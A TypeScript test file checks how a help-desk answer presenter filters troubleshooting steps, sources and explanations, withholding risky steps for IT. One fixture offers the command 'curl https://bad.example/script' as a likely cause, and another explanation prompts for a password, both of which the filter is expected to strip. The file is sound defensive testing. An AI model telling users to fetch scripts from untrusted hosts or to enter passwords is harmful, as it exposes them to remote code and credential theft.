import { describe, expect, test } from "vitest";
import type { AnswerEngineResult, PublicAnswerSource } from "./types";
import { presentAnswer } from "./present";

const sources: PublicAnswerSource[] = [
  {
    id: "official",
    title: "Vendor help",
    domain: "support.example.com",
    url: "https://support.example.com/help",
    tier: "vendor",
    attribution: null,
  },
  {
    id: "community",
    title: "Community discussion",
    domain: "superuser.com",
    url: "https://superuser.com/questions/1",
    tier: "qa_community",
    attribution: "Community contributors",
  },
  {
    id: "reference",
    title: "Reference",
    domain: "developer.mozilla.org",
    url: "https://developer.mozilla.org/reference",
    tier: "reference",
    attribution: null,
  },
  {
    id: "insecure",
    title: "Insecure",
    domain: "example.com",
    url: "http://example.com/help",
    tier: "vendor",
    attribution: null,
  },
];

function answered(
  overrides: Partial<NonNullable<AnswerEngineResult["answer"]>> = {},
  resultOverrides: Partial<AnswerEngineResult> = {}
): AnswerEngineResult {
  return {
    status: "answered",
    runId: "run-1",
    cached: false,
    droppedClaims: 0,
    sources,
    answer: {
      likelyCause: null,
      explanations: [],
      steps: [],
      confidence: 0.8,
      topTier: "vendor",
      ...overrides,
    },
    ...resultOverrides,
  };
}

describe("presentAnswer", () => {
  test("returns an empty card when the engine did not answer", () => {
    expect(
      presentAnswer(
        {
          ...answered(),
          status: "low_confidence",
          answer: null,
        },
        { approvedSoftware: [], communityTipsEnabled: true }
      )
    ).toEqual({
      runId: "run-1",
      outcome: "none",
      likelyCause: null,
      explanations: [],
      steps: [],
      withheldForIt: 0,
      sources: [],
    });
  });

  test("retains safe official and corroborated community steps and cited sources", () => {
    const card = presentAnswer(
      answered({
        likelyCause: {
          text: "The app may need a refresh.",
          sourceIds: ["official"],
        },
        explanations: [
          {
            text: "The service stores settings locally.",
            sourceIds: ["reference"],
          },
        ],
        steps: [
          {
            kind: "official",
            text: "Restart the app.",
            sourceIds: ["official", "insecure"],
            tiers: ["vendor"],
            independentDomains: 1,
            confidence: 0.8,
          },
          {
            kind: "community",
            text: "Clear the app's local cache.",
            sourceIds: ["community"],
            tiers: ["community"],
            independentDomains: 2,
            confidence: 0.7,
          },
        ],
      }),
      { approvedSoftware: [], communityTipsEnabled: true }
    );

    expect(card).toMatchObject({
      outcome: "answer",
      likelyCause: { sourceIds: ["official"] },
      explanations: [{ sourceIds: ["reference"] }],
      steps: [
        { kind: "official", sourceIds: ["official"] },
        { kind: "community_tip", sourceIds: ["community"] },
      ],
      withheldForIt: 0,
      sources: [
        { id: "official", label: "Official docs" },
        { id: "reference", label: "Reference" },
        {
          id: "community",
          label: "Community post",
          attribution: "Community contributors",
        },
      ],
    });
    expect(card.sources.some((source) => source.id === "insecure")).toBe(false);
  });

  test("silently drops disabled or uncorroborated community steps", () => {
    const result = answered({
      steps: [
        {
          kind: "community",
          text: "Clear the local cache.",
          sourceIds: ["community"],
          tiers: ["community"],
          independentDomains: 2,
          confidence: 0.7,
        },
        {
          kind: "community",
          text: "Clear the local cache.",
          sourceIds: ["community"],
          tiers: ["community"],
          independentDomains: 1,
          confidence: 0.7,
        },
      ],
    });

    const uncorroborated = answered({
      steps: [result.answer!.steps[1]],
    });

    expect(
      presentAnswer(result, {
        approvedSoftware: [],
        communityTipsEnabled: false,
      })
    ).toMatchObject({ outcome: "none", steps: [], withheldForIt: 0 });
    expect(
      presentAnswer(uncorroborated, {
        approvedSoftware: [],
        communityTipsEnabled: true,
      })
    ).toMatchObject({ outcome: "none", steps: [], withheldForIt: 0 });
  });

  test.each([
    ["official", "Run the installer as administrator."],
    ["community", "Change the registry key."],
  ] as const)("withholds unsafe %s steps for IT", (kind, text) => {
    expect(
      presentAnswer(
        answered({
          steps: [
            {
              kind,
              text,
              sourceIds: [kind === "official" ? "official" : "community"],
              tiers: [kind === "official" ? "vendor" : "community"],
              independentDomains: 2,
              confidence: 0.8,
            },
          ],
        }),
        { approvedSoftware: [], communityTipsEnabled: true }
      )
    ).toMatchObject({ outcome: "needs_it", steps: [], withheldForIt: 1 });
  });

  test("screens cause and explanation text and keeps only citations from retained items", () => {
    const card = presentAnswer(
      answered({
        likelyCause: {
          text: "Run `curl https://bad.example/script`.",
          sourceIds: ["official"],
        },
        explanations: [
          { text: "Restart the app.", sourceIds: ["reference"] },
          { text: "Enter your password to continue.", sourceIds: ["official"] },
        ],
        steps: [
          {
            kind: "official",
            text: "Open Settings > Network",
            sourceIds: ["official"],
            tiers: ["vendor"],
            independentDomains: 1,
            confidence: 0.8,
          },
        ],
      }),
      { approvedSoftware: [], communityTipsEnabled: false }
    );

    expect(card).toMatchObject({
      outcome: "answer",
      likelyCause: null,
      explanations: [{ text: "Restart the app.", sourceIds: ["reference"] }],
      steps: [{ text: "Open Settings > Network" }],
      sources: [{ id: "reference" }, { id: "official" }],
    });
  });
});
